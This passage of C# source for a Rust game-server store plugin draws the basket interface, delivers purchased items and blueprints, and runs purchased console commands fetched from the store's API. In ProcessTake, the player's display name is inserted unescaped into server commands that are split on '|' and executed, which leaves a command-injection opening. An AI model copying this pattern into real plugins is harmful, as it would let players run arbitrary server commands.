                                            Text = { Text = "Ваша корзина пуста", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 34 }
                                        }, StoreLayer + ".BlockPanel", StoreLayer + ".BlockPanel.Text");
                                        CuiHelper.AddUi(player, secondContainer);
                                    }
                                    if (firstInfo["code"].ToString() == "105")
                                    {
                                        CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel.Text");
                                        CuiElementContainer secondContainer = new CuiElementContainer();
                                        secondContainer.Add(new CuiLabel
                                        {
                                            RectTransform = { AnchorMin = "0 0.1", AnchorMax = "1 1", OffsetMax = "0 0" },
                                            Text = { Text = "Вы не авторизованы в магазине!\n" +
                                                        "Ссылку на авторизацию вы можете найти в разделе 'помощь'", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 34 }
                                        }, StoreLayer + ".BlockPanel", StoreLayer + ".BlockPanel.Text");
                                        CuiHelper.AddUi(player, secondContainer);
                                    }
                                }
                                else
                                {
                                    CuiElementContainer secondContainer = new CuiElementContainer();

                                    if (!(firstInfo["data"] is List<object>))
                                    {
                                        PrintError("Unkown error #1");
                                        CuiHelper.DestroyUi(player, StoreLayer);
                                        return;
                                    }
                                    List<object> data = firstInfo["data"] as List<object>;
                                    List<WItem> wItems = new List<WItem>();

                                    foreach (var check in data.Skip(page * 21).Take(21))
                                    {
                                        wItems.Add(new WItem(check as Dictionary<string, object>));

                                    }
                                    if (playersBasketCache.ContainsKey(player.userID))
                                        playersBasketCache[player.userID].Clear();

                                    foreach (Dictionary<string, object> product in data)
                                    {
                                        if (product.ContainsKey("id"))
                                        {
                                            if (!playersBasketCache.ContainsKey(player.userID))
                                                playersBasketCache.Add(player.userID, new List<int>());

                                            playersBasketCache[player.userID].Add(Convert.ToInt32(product["id"]));
                                        }
                                            
                                    }
                                    secondContainer.Add(new CuiLabel
                                    {
                                        RectTransform = { AnchorMin = "0.4 0.14", AnchorMax = "0.4 0.14", OffsetMin = "82.5 -125", OffsetMax = "102.5 40" },
                                        Text = { Text = (page + 1).ToString(), Align = TextAnchor.MiddleCenter, FontSize = 20 }
                                    }, StoreLayer + ".BlockPanel");

                                    secondContainer.Add(new CuiButton
                                    {
                                        RectTransform = { AnchorMin = "0.4 0.14", AnchorMax = "0.4 0.14", OffsetMin = "-20 -125", OffsetMax = "125 40" },
                                        Button = { Color = "0 0 0 0", Material = "", Command = page > 0 ? $"UI_GameStoresRUST page {page - 1}" : "" },
                                        Text = { Text = "<", Color = page > 0 ? "1 1 1 1" : "1 1 1 0.2", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 24 }
                                    }, StoreLayer + ".BlockPanel");

                                    secondContainer.Add(new CuiButton
                                    {
                                        RectTransform = { AnchorMin = "0.6 0.14", AnchorMax = "0.6 0.14", OffsetMin = "-125 -125", OffsetMax = "20 40" },
                                        Button = { Color = "0 0 0 0", Material = "", Command = (page + 1) * 21 < data.Count ? $"UI_GameStoresRUST page {page + 1}" : "" },
                                        Text = { Text = ">", Color = (page + 1) * 21 < data.Count ? "1 1 1 1" : "1 1 1 0.2", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 24 }
                                    }, StoreLayer + ".BlockPanel");


                                    double xSwitch = 0;
                                    double ySwitch = 0;
                                    for (int i = 0; i < Settings.InterfaceSettings.ItemOnString * Settings.InterfaceSettings.StringAmount; i++)
                                    {
                                        UI_RecountPosition(ref xSwitch, ref ySwitch, i, Settings.InterfaceSettings.ItemOnString * Settings.InterfaceSettings.StringAmount);

                                        secondContainer.Add(new CuiButton
                                        {
                                            RectTransform = { AnchorMin = "0.495 0.55", AnchorMax = "0.495 0.55", OffsetMin = $"{xSwitch} {ySwitch - Settings.InterfaceSettings.ItemSide}", OffsetMax = $"{xSwitch + Settings.InterfaceSettings.ItemSide} {ySwitch}" },
                                            Button = { Color = "1 1 1 0.2", Command = $"" },
                                            Text = { Text = "" }
                                        }, StoreLayer + ".BlockPanel", StoreLayer + $".BlockPanel.{i}");
                                    }

                                    /*if (player.IsAdmin) 
                                    {
                                        LogToFile("Test", "123 - " + JsonConvert.SerializeObject(wItems), this);  
                                    } */
                                    foreach (var check in wItems.Select((i, t) => new { A = i, B = t }))
                                    {
                                        if (check.A.IsBlueprint)
                                        {
                                            if (plugins.Find("ImageLibrary") != null)
                                            {
                                                secondContainer.Add(new CuiElement
                                                {
                                                    Parent = StoreLayer + ".BlockPanel." + check.B,
                                                    Components =
                                                {
                                                    new CuiRawImageComponent { Png = (string) plugins.Find("ImageLibrary").Call("GetImage", "blueprintbase") },
                                                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "5 5", OffsetMax = "-5 -5" },
                                                }
                                                });
                                            }
                                            else
                                            {
                                                secondContainer.Add(new CuiElement
                                                {
                                                    Parent = StoreLayer + ".BlockPanel." + check.B,
                                                    Components =
                                                {
                                                    new CuiRawImageComponent { Url = "https://gamestores.ru/img/games/rust/blueprintbase.png" },
                                                    new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "5 5", OffsetMax = "-5 -5" },
                                                }
                                                });
                                            }
                                        }
                                        if (!check.A.ImageUrl.Contains("http"))
                                        {
                                            secondContainer.Add(new CuiElement
                                            {
                                                Parent = StoreLayer + ".BlockPanel." + check.B,
                                                Components =
                                            {
                                                new CuiRawImageComponent { Png = check.A.ImageUrl },
                                                new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "5 5", OffsetMax = "-5 -5" },
                                            }
                                            });
                                        }
                                        else
                                        {
                                            secondContainer.Add(new CuiElement
                                            {
                                                Parent = StoreLayer + ".BlockPanel." + check.B,
                                                Components =
                                            {
                                                new CuiRawImageComponent { Url = check.A.ImageUrl },
                                                new CuiRectTransformComponent { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "5 5", OffsetMax = "-5 -5" },
                                            }
                                            });
                                        }

                                        if (check.A.Amount > 1)
                                        {
                                            secondContainer.Add(new CuiLabel
                                            {
                                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMin = "0 5", OffsetMax = "-5 0" },
                                                Text = { Text = "x" + check.A.Amount, Align = TextAnchor.LowerRight, Font = "robotocondensed-regular.ttf", FontSize = 24 }
                                            }, StoreLayer + ".BlockPanel." + check.B);
                                        }

                                        if (check.A.Blocked)
                                        {
                                            double left = check.A.Block_Date - CurrentTime();

                                            secondContainer.Add(new CuiButton
                                            {
                                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                                Button = { Color = "1 0.5 0.5 0.2", Command = $"UI_GameStoresRUST take {check.B} {check.A.ID} blocked {left}" },
                                                Text = { Text = "", Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 38 }
                                            }, StoreLayer + ".BlockPanel." + check.B, StoreLayer + ".BlockPanel." + check.B + ".Open");
                                        }
                                        else
                                        {
                                            secondContainer.Add(new CuiButton
                                            {
                                                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                                                Button = { Color = "0 0 0 0", Close = StoreLayer + ".BlockPanel." + check.B + ".Open", Command = $"UI_GameStoresRUST take {check.B} {check.A.ID}" },
                                                Text = { Text = "" }
                                            }, StoreLayer + ".BlockPanel." + check.B, StoreLayer + ".BlockPanel." + check.B + ".Open");
                                        }

                                        secondContainer.Add(new CuiLabel
                                        {
                                            RectTransform = { AnchorMin = "0 0", AnchorMax = "1 0", OffsetMin = "0 -22.5", OffsetMax = "0 0" },
                                            Text = { Text = check.A.Name, Align = TextAnchor.MiddleCenter, Font = "robotocondensed-regular.ttf", FontSize = 16, Color = "1 1 1 0.8" }
                                        }, StoreLayer + ".BlockPanel." + check.B);
                                    }

                                    CuiHelper.AddUi(player, secondContainer);
                                    CuiHelper.DestroyUi(player, StoreLayer + ".BlockPanel.Text");
                                }
                            }
                            break;
                        }
                }
            }, player);
            });
        }

        private string IconLayer = "UI_GameStoresRUST_Bucket";
        private void InitializeIcon(BasePlayer player)
        {
            CuiHelper.DestroyUi(player, IconLayer);
            CuiElementContainer container = new CuiElementContainer();
            if (Settings.InterfaceSettings.BucketURL.Contains("http"))
            {
                if (ImageLibrary)
                {
                    container.Add(new CuiElement
                    {
                        Parent = "Overlay",
                        Name = IconLayer,
                        Components =
                        {
                            new CuiRawImageComponent { Png = (string) ImageLibrary.Call("GetImage", "GameStoresRUSTBucket") },
                            new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "8 -40", OffsetMax = "43 -6" }
                        }
                    });

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                        Button = { Color = "0 0 0 0", Command = "chat.say /store" },
                        Text = { Text = "" }
                    }, IconLayer);
                }
                else
                {
                    container.Add(new CuiElement
                    {
                        Parent = "Overlay",
                        Name = IconLayer,
                        Components =
                        {
                            new CuiRawImageComponent { Url = Settings.InterfaceSettings.BucketURL },
                            new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "8 -40", OffsetMax = "43 -6" }
                        }
                    });

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1", OffsetMax = "0 0" },
                        Button = { Color = "0 0 0 0", Command = "chat.say /store" },
                        Text = { Text = "" }
                    }, IconLayer);
                }
            }
            else
            {
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "8 -40", OffsetMax = "43 -6" },
                    Button = { Color = "1 1 1 0.6", Sprite = "assets/icons/open.png", Command = "chat.say /store" },
                    Text = { Text = "" }
                }, "Overlay", IconLayer);
            }

            CuiHelper.AddUi(player, container);
        }

        #endregion

        #region Utils

        private void ShowNotify(BasePlayer player, string text)
        {
            CuiHelper.DestroyUi(player, StoreLayer + ".Notify");
            CuiElementContainer container = new CuiElementContainer();

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.76", AnchorMax = "1 0.86", OffsetMax = "0 0" },
                Text = { FadeIn = 1f, Text = text, Align = TextAnchor.UpperCenter, Font = "robotocondensed-regular.ttf", FontSize = 16 }
            }, StoreLayer, StoreLayer + ".Notify");

            CuiHelper.AddUi(player, container);
        }

        private void ProcessTake(BasePlayer player, Dictionary<string, object> obj)
        {
            //foreach (var check in obj)
            //   PrintError(check.Key + " -> " + check.Value); 
            LogAction(player, $"Начало обработки товара");
            WItem itemInfo = new WItem(obj);
            try
            {
                if (itemInfo.IsItem)
                {
                    LogAction(player, $"Попытка получения предмета: {itemInfo.ShortName} [{itemInfo.Amount}]");
                    var info = ItemManager.FindItemDefinition(itemInfo.ShortName);
                    if (info == null) return;

                    var item = ItemManager.Create(info, itemInfo.Amount);
                    if (!player.inventory.GiveItem(item))
                    {
                        LogAction(player, $"У игрока не было места для получения предмета, предмет выброшен {itemInfo.ShortName} [{itemInfo.Amount} {player.transform.position}]");

                        item.Drop(player.transform.position, Vector3.down * 3);
                        ShowNotify(player, $"Вы успешно получили предмет  › <size=20>{info.displayName.english}</size> ‹\n" +
                                           $"У вас недостаточно места в инвентаре, <b>предмет брошен</b> под ноги!");
                    }
                    else
                    {
                        LogAction(player, $"Предмет выдан игроку в инвентарь");
                        ShowNotify(player, $"Вы успешно получили предмет  › <size=20>{info.displayName.english}</size> ‹");
                    }
                }

                if (itemInfo.IsCommand)
                {
                    LogAction(player, $"Попытка получения команды");

                    string command = itemInfo.Command.Replace("\n", "|").Replace("%steamid%", player.UserIDString, StringComparison.OrdinalIgnoreCase).Replace("%username%", player.displayName, StringComparison.OrdinalIgnoreCase);
                    foreach (var check in command.Split('|'))
                    {
                        LogAction(player, $"Исполнение команды: {check}");
                        Server.Command(check);
                    }


                    ShowNotify(player, $"Вы успешно получили предмет  › <size=20>{itemInfo.Name}</size> ‹\n" +
                                       $"Теперь вам доступны новые привилегии!");
                }

                if (itemInfo.IsBlueprint)
                {
                    LogAction(player, $"Попытка получения рецепта {itemInfo.ShortName}");
                    Item create = ItemManager.CreateByItemID(-996920608);

                    var info = ItemManager.FindItemDefinition(itemInfo.ShortName);
                    create.blueprintTarget = info.itemid;

                    if (!player.inventory.GiveItem(create))
                    {
                        create.Drop(player.transform.position, Vector3.down * 3);
                        ShowNotify(player, $"Вы успешно получили рецепт предмета  › <size=20>{info.displayName.english}</size> ‹\n" +
                                           $"У вас недостаточно места в инвентаре, <b>предмет брошен</b> под ноги!");
                    }
                    else
                    {
                        LogAction(player, $"У игрока не было места для получения рецепта, рецепт выброшен {itemInfo.ShortName} [{itemInfo.Amount} {player.transform.position}]");

                        LogAction(player, $"Рецепт выдан игроку в инвентарь");
                        LogAction(player, $"Вы успешно получили рецепт предмета  › <size=20>{info.displayName.english}</size> ‹");
                    }
                }
            } catch (Exception e)
            {
                LogAction(player, $"Ошибка получения товара [{itemInfo.ID}][{itemInfo.Name}]");
                LogToFile("!Errors", $"{DateTime.Now.ToShortTimeString()}| Error: '{e.ToString()}'", this);
                PrintError($"Error receiving product [{itemInfo.ID}], info saved to log");
            }
            
        }

        private static readonly Dictionary<int, string> IDToShortName = new Dictionary<int, string> { [-1461508848] = "rifle.ak", [2115555558] = "ammo.handmade.shell", [-533875561] = "ammo.pistol", [1621541165] = "ammo.pistol.fire", [-422893115] = "ammo.pistol.hv", [815896488] = "ammo.rifle", [805088543] = "ammo.rifle.explosive", [449771810] = "ammo.rifle.incendiary", [1152393492] = "ammo.rifle.hv", [1578894260] = "ammo.rocket.basic", [1436532208] = "ammo.rocket.fire", [542276424] = "ammo.rocket.hv", [1594947829] = "ammo.rocket.smoke", [-1035059994] = "ammo.shotgun", [1818890814] = "ammo.shotgun.fire", [1819281075] = "ammo.shotgun.slug", [1685058759] = "antiradpills", [93029210] = "apple", [-1565095136] = "apple.spoiled", [-1775362679] = "arrow.bone", [-1775249157] = "arrow.fire", [-1280058093] = "arrow.hv", [-420273765] = "arrow.wooden", [563023711] = "autoturret", [790921853] = "axe.salvaged", [-337261910] = "bandage", [498312426] = "barricade.concrete", [504904386] = "barricade.metal", [-1221200300] = "barricade.sandbags", [510887968] = "barricade.stone", [-814689390] = "barricade.wood", [1024486167] = "barricade.woodwire", [2021568998] = "battery.small", [97329] = "bbq", [1046072789] = "trap.bear", [97409] = "bed", [-1480119738] = "tool.binoculars", [1611480185] = "black.raspberries", [-1386464949] = "bleach", [93832698] = "blood", [-1063412582] = "blueberries", [-1887162396] = "blueprintbase", [-55660037] = "rifle.bolt", [919780768] = "bone.club", [-365801095] = "bone.fragments", [68998734] = "botabag", [-853695669] = "bow.hunting", [271534758] = "box.wooden.large", [-770311783] = "box.wooden", [-1192532973] = "bucket.water", [-307490664] = "building.planner", [707427396] = "burlap.shirt", [707432758] = "burlap.shoes", [-2079677721] = "cactusflesh", [-1342405573] = "tool.camera", [-139769801] = "campfire", [-1043746011] = "can.beans", [2080339268] = "can.beans.empty", [-171664558] = "can.tuna", [1050986417] = "can.tuna.empty", [-1693683664] = "candycaneclub", [523409530] = "candycane", [1300054961] = "cctv.camera", [-2095387015] = "ceilinglight", [1428021640] = "chainsaw", [94623429] = "chair", [1436001773] = "charcoal", [1711323399] = "chicken.burned", [1734319168] = "chicken.cooked", [-1658459025] = "chicken.raw", [-726947205] = "chicken.spoiled", [-341443994] = "chocholate", [1540879296] = "xmasdoorwreath", [94756378] = "cloth", [3059095] = "coal", [3059624] = "corn", [2045107609] = "clone.corn", [583366917] = "seed.corn", [2123300234] = "crossbow", [1983936587] = "crude.oil", [1257201758] = "cupboard.tool", [-1144743963] = "diving.fins", [-1144542967] = "diving.mask", [-1144334585] = "diving.tank", [1066729526] = "diving.wetsuit", [-1598790097] = "door.double.hinged.metal", [-933236257] = "door.double.hinged.toptier", [-1575287163] = "door.double.hinged.wood", [-2104481870] = "door.hinged.metal", [-1571725662] = "door.hinged.toptier", [1456441506] = "door.hinged.wood", [1200628767] = "door.key", [-778796102] = "door.closer", [1526866730] = "xmas.door.garland", [1925723260] = "dropbox", [1891056868] = "ducttape", [1295154089] = "explosive.satchel", [498591726] = "explosive.timed", [1755466030] = "explosives", [726730162] = "facialhair.style01", [-1034048911] = "fat.animal", [252529905] = "femalearmpithair.style01", [471582113] = "femaleeyebrow.style01", [-1138648591] = "femalepubichair.style01", [305916740] = "female_hairstyle_01", [305916742] = "female_hairstyle_03", [305916744] = "female_hairstyle_05", [1908328648] = "fireplace.stone", [-2078972355] = "fish.cooked", [-533484654] = "fish.raw", [1571660245] = "fishingrod.handmade", [1045869440] = "flamethrower", [1985408483] = "flameturret", [97513422] = "flare", [1496470781] = "flashlight.held", [1229879204] = "weapon.mod.flashlight", [-1722829188] = "floor.grill", [1849912854] = "floor.ladder.hatch", [-1266285051] = "fridge", [-1749787215] = "boots.frog", [28178745] = "lowgradefuel", [-505639592] = "furnace", [1598149413] = "furnace.large", [-1779401418] = "gates.external.high.stone", [-57285700] = "gates.external.high.wood", [98228420] = "gears", [1422845239] = "geiger.counter", [277631078] = "generator.wind.scrap", [115739308] = "burlap.gloves", [-522149009] = "gloweyes", [3175989] = "glue", [718197703] = "granolabar", [384204160] = "grenade.beancan", [-1308622549] = "grenade.f1", [-217113639] = "fun.guitar", [-1580059655] = "gunpowder", [-1832205789] = "male_hairstyle_01", [305916741] = "female_hairstyle_02", [936777834] = "attire.hide.helterneck", [-1224598842] = "hammer", [-1976561211] = "hammer.salvaged", [-1406876421] = "hat.beenie", [-1397343301] = "hat.boonie", [1260209393] = "bucket.helmet", [-1035315940] = "burlap.headwrap", [-1381682752] = "hat.candle", [696727039] = "hat.cap", [-2128719593] = "coffeecan.helmet", [-1178289187] = "deer.skull.mask", [1351172108] = "heavy.plate.helmet", [-450738836] = "hat.miner", [-966287254] = "attire.reindeer.headband", [340009023] = "riot.helmet", [124310981] = "hat.wolf", [1501403549] = "wood.armor.helmet", [698310895] = "hatchet", [523855532] = "hazmatsuit", [2045246801] = "clone.hemp", [583506109] = "seed.hemp", [-148163128] = "attire.hide.boots", [-132588262] = "attire.hide.skirt", [-1666761111] = "attire.hide.vest", [-465236267] = "weapon.mod.holosight", [-1211618504] = "hoodie", [2133577942] = "hq.metal.ore", [-1014825244] = "humanmeat.burned", [-991829475] = "humanmeat.cooked", [-642008142] = "humanmeat.raw", [661790782] = "humanmeat.spoiled", [-1440143841] = "icepick.salvaged", [569119686] = "bone.armor.suit", [1404466285] = "heavy.plate.jacket", [-1616887133] = "jacket.snow", [-1167640370] = "jacket", [-1284735799] = "jackolantern.angry", [-1278649848] = "jackolantern.happy", [776005741] = "knife.bone", [108061910] = "ladder.wooden.wall", [255101535] = "trap.landmine", [-51678842] = "lantern", [-789202811] = "largemedkit", [516382256] = "weapon.mod.lasersight", [50834473] = "leather", [-975723312] = "lock.code", [1908195100] = "lock.key", [-1097452776] = "locker", [146685185] = "longsword", [-1716193401] = "rifle.lr300", [193190034] = "lmg.m249", [371156815] = "pistol.m92", [3343606] = "mace", [825308669] = "machete", [830965940] = "mailbox", [1662628660] = "male.facialhair.style02", [1662628661] = "male.facialhair.style03", [1662628662] = "male.facialhair.style04", [-1832205788] = "male_hairstyle_02", [-1832205786] = "male_hairstyle_04", [1625090418] = "malearmpithair.style01", [-1269800768] = "maleeyebrow.style01", [429648208] = "malepubichair.style01", [-1832205787] = "male_hairstyle_03", [-1832205785] = "male_hairstyle_05", [107868] = "map", [997973965] = "mask.balaclava", [-46188931] = "mask.bandana", [-46848560] = "metal.facemask", [-2066726403] = "bearmeat.burned", [-2043730634] = "bearmeat.cooked", [1325935999] = "bearmeat", [-225234813] = "deermeat.burned", [-202239044] = "deermeat.cooked", [-322501005] = "deermeat.raw", [-1851058636] = "horsemeat.burned", [-1828062867] = "horsemeat.cooked", [-1966381470] = "horsemeat.raw", [968732481] = "meat.pork.burned", [991728250] = "meat.pork.cooked", [-253819519] = "meat.boar", [-1714986849] = "wolfmeat.burned", [-1691991080] = "wolfmeat.cooked", [179448791] = "wolfmeat.raw", [431617507] = "wolfmeat.spoiled", [688032252] = "metal.fragments", [-1059362949] = "metal.ore", [1265861812] = "metal.plate.torso", [374890416] = "metal.refined", [1567404401] = "metalblade", [-1057402571] = "metalpipe", [-758925787] = "mining.pumpjack", [-1411620422] = "mining.quarry", [88869913] = "fish.minnows", [-2094080303] = "smg.mp5", [843418712] = "mushroom", [-1569356508] = "weapon.mod.muzzleboost", [-1569280852] = "weapon.mod.muzzlebrake", [449769971] = "pistol.nailgun", [590532217] = "ammo.nailgun.nails", [3387378] = "note", [1767561705] = "burlap.trousers", [106433500] = "pants", [-1334615971] = "heavy.plate.pants", [-135651869] = "attire.hide.pants", [-1595790889] = "roadsign.kilt", [-459156023] = "pants.shorts", [106434956] = "paper", [-578028723] = "pickaxe", [-586116979] = "jar.pickle", [-1379225193] = "pistol.eoka", [-930579334] = "pistol.revolver", [548699316] = "pistol.semiauto", [142147109] = "planter.large", [148953073] = "planter.small", [102672084] = "attire.hide.poncho", [640562379] = "pookie.bear", [-1732316031] = "xmas.present.large", [-2130280721] = "xmas.present.medium", [-1725510067] = "xmas.present.small", [1974032895] = "propanetank", [-225085592] = "pumpkin", [509654999] = "clone.pumpkin", [466113771] = "seed.pumpkin", [2033918259] = "pistol.python", [2069925558] = "target.reactive", [-1026117678] = "box.repair.bench", [1987447227] = "research.table", [540154065] = "researchpaper", [1939428458] = "riflebody", [-288010497] = "roadsign.jacket", [-847065290] = "roadsigns", [3506021] = "rock", [649603450] = "rocket.launcher", [3506418] = "rope", [569935070] = "rug.bear", [113284] = "rug", [1916127949] = "water.salt", [-1775234707] = "salvaged.cleaver", [-388967316] = "salvaged.sword", [2007564590] = "santahat", [-1705696613] = "scarecrow", [670655301] = "hazmatsuit_scientist", [1148128486] = "hazmatsuit_scientist_peacekeeper", [-141135377] = "weapon.mod.small.scope", [109266897] = "scrap", [-527558546] = "searchlight", [-1745053053] = "rifle.semiauto", [1223860752] = "semibody", [-419069863] = "sewingkit", [-1617374968] = "sheetmetal", [2057749608] = "shelves", [24576628] = "shirt.collared", [-1659202509] = "shirt.tanktop", [2107229499] = "shoes.boots", [191795897] = "shotgun.double", [-1009492144] = "shotgun.pump", [2077983581] = "shotgun.waterpipe", [378365037] = "guntrap", [-529054135] = "shutter.metal.embrasure.a", [-529054134] = "shutter.metal.embrasure.b", [486166145] = "shutter.wood.a", [1628490888] = "sign.hanging.banner.large", [1498516223] = "sign.hanging", [-632459882] = "sign.hanging.ornate", [-626812403] = "sign.pictureframe.landscape", [385802761] = "sign.pictureframe.portrait", [2117976603] = "sign.pictureframe.tall", [1338515426] = "sign.pictureframe.xl", [-1455694274] = "sign.pictureframe.xxl", [1579245182] = "sign.pole.banner.large", [-587434450] = "sign.post.double", [-163742043] = "sign.post.single", [-1224714193] = "sign.post.town", [644359987] = "sign.post.town.roof", [-1962514734] = "sign.wooden.huge", [-705305612] = "sign.wooden.large", [-357728804] = "sign.wooden.medium", [-698499648] = "sign.wooden.small", [1213686767] = "weapon.mod.silencer", [386382445] = "weapon.mod.simplesight", [1859976884] = "skull_fire_pit", [960793436] = "skull.human", [1001265731] = "skull.wolf", [1253290621] = "sleepingbag", [470729623] = "small.oil.refinery", [1051155022] = "stash.small", [865679437] = "fish.troutsmall", [927253046] = "smallwaterbottle", [109552593] = "smg.2", [-2092529553] = "smgbody", [691633666] = "snowball", [-2055888649] = "snowman", [621575320] = "shotgun.spas12", [-2118132208] = "spear.stone", [-1127699509] = "spear.wooden", [-685265909] = "spikes.floor", [552706886] = "spinner.wheel", [1835797460] = "metalspring", [-892259869] = "sticks", [-1623330855] = "stocking.large", [-1616524891] = "stocking.small", [789892804] = "stone.pickaxe", [-1289478934] = "stonehatchet", [-892070738] = "stones", [-891243783] = "sulfur", [889398893] = "sulfur.ore", [-1625468793] = "supply.signal", [1293049486] = "surveycharge", [1369769822] = "fishtrap.small", [586484018] = "syringe.medical", [110115790] = "table", [1490499512] = "targeting.computer", [3552619] = "tarp", [1471284746] = "techparts", [456448245] = "smg.thompson", [110547964] = "torch", [1588977225] = "xmas.decoration.baubels", [918540912] = "xmas.decoration.candycanes", [-471874147] = "xmas.decoration.gingerbreadmen", [205978836] = "xmas.decoration.lights", [-1044400758] = "xmas.decoration.pinecone", [-2073307447] = "xmas.decoration.star", [435230680] = "xmas.decoration.tinsel", [-864578046] = "tshirt", [1660607208] = "tshirt.long", [260214178] = "tunalight", [-1847536522] = "vending.machine", [-496055048] = "wall.external.high.stone", [-1792066367] = "wall.external.high", [562888306] = "wall.frame.cell.gate", [-427925529] = "wall.frame.cell", [995306285] = "wall.frame.fence.gate", [-378017204] = "wall.frame.fence", [447918618] = "wall.frame.garagedoor", [313836902] = "wall.frame.netting", [1175970190] = "wall.frame.shopfront", [525244071] = "wall.frame.shopfront.metal", [-1021702157] = "wall.window.bars.metal", [-402507101] = "wall.window.bars.toptier", [-1556671423] = "wall.window.bars.wood", [61936445] = "wall.window.glass.reinforced", [112903447] = "water", [1817873886] = "water.catcher.large", [1824679850] = "water.catcher.small", [-1628526499] = "water.barrel", [547302405] = "waterjug", [1840561315] = "water.purifier", [-460592212] = "xmas.window.garland", [3655341] = "wood", [1554697726] = "wood.armor.jacket", [-1883959124] = "wood.armor.pants", [-481416622] = "workbench1", [-481416621] = "workbench2", [-481416620] = "workbench3", [-1151126752] = "xmas.lightstring", [-1926458555] = "xmas.tree" };

        private void UI_RecountPosition(ref double xSwitch, ref double ySwitch, int count, int max)
        {
            var stringAmount = Math.Ceiling((double)max / Settings.InterfaceSettings.ItemOnString);
            var currentString = Math.Floor((double)count / Settings.InterfaceSettings.ItemOnString);
            var currentPosition = count % Settings.InterfaceSettings.ItemOnString;


            var topYPosition = 0 + (float)stringAmount / 2 * Settings.InterfaceSettings.ItemSide + ((float)stringAmount / 2 - 1) * Settings.InterfaceSettings.ItemMargin;
            var topXPosition = 0 - (float)Settings.InterfaceSettings.ItemOnString / 2 * Settings.InterfaceSettings.ItemSide - ((float)Settings.InterfaceSettings.ItemOnString / 2 - 1) * Settings.InterfaceSettings.ItemMargin;

            var curYPosition = topYPosition - currentString * Settings.InterfaceSettings.ItemSide - (currentString) * (Settings.InterfaceSettings.ItemMargin + (Settings.InterfaceSettings.TextShow ? 20 : 0));
            var curXPosition = topXPosition + currentPosition * Settings.InterfaceSettings.ItemSide + (currentPosition) * Settings.InterfaceSettings.ItemMargin;

            xSwitch = curXPosition;
            ySwitch = curYPosition;
        }

        public static bool CheckInstantWork = false;
        public Timer CheckInstantWorkGlobalTimer = null;

        private void CheckInstant()
        {
            if (CheckInstantWork == true)
                return;

            CheckInstantWork = true;
            if (CheckInstantWorkGlobalTimer != null)
                CheckInstantWorkGlobalTimer.Destroy();

            CheckInstantWorkGlobalTimer = timer.Once(300, () => { CheckInstantWork = false; });

            Request($"&method=basket.commands.instant", (code, response) =>
            {
                switch (code)
                {
                    case 0:
                        {
                            LogAction(null, $"Ошибка выполнения запроса для выдачи автоматических команд");
                            CheckInstantWork = false;
                            break;
                        }
                    case 200:
                        {
                            var firstInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(response, new KeyValuesConverter());
                            if (firstInfo.ContainsKey("result"))
                            {
                                if (firstInfo["result"].ToString() == "success")
                                {
                                    List<object> data = firstInfo["data"] as List<object>;
                                    int i = 1;
                                    timer.Once(data.Count + 2, () => { CheckInstantWork = false; });

                                    foreach (Dictionary<string, object> product in data)
                                    {
                                        if (product.ContainsKey("id"))
                                        {
                                            timer.Once(i, () => { TakeInstant(Convert.ToInt32(product["id"]), product["steam_id"].ToString()); } );                                             
                                            i++;
                                        }

                                    }                                  
                                } else CheckInstantWork = false;
                            } else CheckInstantWork = false;
                            break;
                        }
                    default:
                        {
                            LogAction(null, $"Ошибка выполнения запроса для выдачи автоматических команд");
                            CheckInstantWork = false;
                            break;
                        }
                }
            }, null); 
        }

        private void TakeInstant(int GsProductId, string SteamId)
        {
            LogAction(null, $"---------------------------------");
            LogAction(null, $"[AutoCommands] Запрос на получение товара [{GsProductId}][{SteamId}]");
            Request($"&item=true&id={GsProductId}", (i, s) =>
            {
                switch (i)
                {
                    case 0:
                        LogAction(null, $"[AutoCommands] API не ответило на запрос: {GsProductId}");
                        PrintError("Api does not responded to a request");
                        break;
                    case 200:
                        Dictionary<string, object> response = JsonConvert.DeserializeObject<Dictionary<string, object>>(s, new KeyValuesConverter());
                        if (!response.ContainsKey("data"))
                        {
                            LogAction(null, $"[AutoCommands] Ошибка получения товара, отсутствует Data [{GsProductId}]");
                            return;
                        } else
                        {
                            Request($"&gived=true&id={GsProductId}", (code, newResponse) =>
                            {
                                if (code != 200 || JsonConvert.DeserializeObject<JObject>(newResponse)["result"].ToString() != "success")
                                {
                                    LogAction(null, $"[AutoCommands] Ошибка получения товара [{GsProductId}][{SteamId}]");
                                    return;
                                }
                                else
                                {
                                    WItem itemInfo = new WItem(response["data"] as Dictionary<string, object>);
                                    if (itemInfo.IsCommand)
                                    {
                                        LogAction(null, $"[AutoCommands] Товар отмечен полученным [{GsProductId}][{SteamId}]");
                                        string command = itemInfo.Command.Replace("\n", "|").Replace("%steamid%", SteamId, StringComparison.OrdinalIgnoreCase);
                                        foreach (var check in command.Split('|'))
                                        {
                                            LogAction(null, $"[AutoCommands] Исполнение команды: {check} [{GsProductId}][{SteamId}]");
                                            Server.Command(check);
                                        }
                                    }
                                    else
                                    {
                                        LogAction(null, $"[AutoCommands] Ошибка получения (товар не является командой) [{GsProductId}][{SteamId}]");
                                    }
                                }
                            }, null);
                        }
                       
                        break;
                    case 404:
